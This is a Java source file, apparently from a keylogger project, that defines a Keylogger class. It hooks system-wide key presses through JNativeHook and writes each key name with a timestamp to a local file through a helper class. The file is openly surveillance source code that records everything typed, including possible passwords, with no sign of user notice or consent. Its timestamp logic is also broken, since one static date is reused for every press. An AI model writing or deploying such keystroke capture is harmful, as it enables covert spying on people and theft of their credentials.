package me.pasteiton.kl.features;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import me.pasteiton.kl.utils.FileManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Keylogger Class. Manages key press events
 * @author Jon McLean
 * @version 1.0
 */

public class Keylogger implements NativeKeyListener{
	
	public static DateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
	public static Date date = new Date();
	
	// Key Pressed
	public void nativeKeyPressed(NativeKeyEvent e) {
		//This will eventaully log all presses into a text file or something
		//System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		FileManager fm = new FileManager(); 
		fm.createLocation();
		fm.printContents(NativeKeyEvent.getKeyText(e.getKeyCode()) + " " + dateFormat.format(date));
	}
	
	public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        //System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }
    
}
